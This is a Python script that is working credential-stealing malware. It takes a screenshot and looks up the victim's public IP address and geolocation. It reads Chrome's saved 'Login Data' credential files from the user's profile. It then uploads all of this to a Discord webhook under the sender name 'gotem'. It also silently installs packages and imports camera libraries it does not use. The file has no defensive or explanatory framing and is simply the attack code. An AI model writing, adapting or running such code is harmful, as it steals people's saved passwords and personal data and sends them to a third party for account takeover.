didit = False 
cam = False 
URL = 'DISCORD WEBHOOK URL'
api_geo = 'API KEY FOR api.ipgeolocation.io' 
api_1 = 'API KEY FOR api.whatismyip.com' 

                    
import os
import pyautogui

os.system('cmd /c "pip install pyautogui pip install requests && pip install discord_webhook && pip install discord.py && pip install base64 && pip install opencv-python && pip install time && pip install pygame')

import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import base64

myScreenshot = pyautogui.screenshot()
myScreenshot.save('eriweuroiu39.png')

username = os.getenv('USER', os.getenv('USERNAME', 'user'))

response=requests.get(f'https://api.whatismyip.com/ip.php?key={api_1}')
print(response.status_code)
IPA = response.text

with open("IPLTtxt", 'a') as f:
    f.write(response.text)
                        
response1 = requests.get(f'https://api.ipgeolocation.io/ipgeo?apiKey={api_geo}&ip={IPA}')
print(response1.status_code)
IPGL = response1.text

with open("IPGLtxt", 'a') as f:
    f.write(response1.text)
                        
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data For Account"%(os.environ['USERPROFILE']))
CHROME_PATH2 = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))

with open(file=CHROME_PATH, mode='rb') as f:
    s = f.read()
                        
with open(file=CHROME_PATH2, mode='rb') as f:
    e=f.read()

# Python program to capture a single image
# using pygame library
                      
# importing the pygame library
x=0
import cv2
import time
import pygame
import pygame.camera

files = {
    f'CHROME LOGIN DATA FOR {username}': (s),
    'CHROME LOGIN DATA 2': (e)
    }
                        
content = f"""
NAME (USERNAME): {username}

IP: {IPA}

GEO: {IPGL}

CHROME LOGIN DATA:

(FILE ATTACHED)

"""

webhook = DiscordWebhook(url=URL, username="gotem", content=content, files=files)
                    
webhookgo = webhook.execute()

webhook = DiscordWebhook(url=URL, username="gotem", content="SCREENSHOT")
with open("eriweuroiu39.png", "rb") as f:
    webhook.add_file(file=f.read(), filename='example.jpg')
                        
    embed = DiscordEmbed(title='Screenshot', description=f'Screenshot for {username}s screen', color='03b2f8')
    embed.set_thumbnail(url='attachment://example.jpg')
                        
    webhook.add_embed(embed)
    response = webhook.execute()
                    
                    
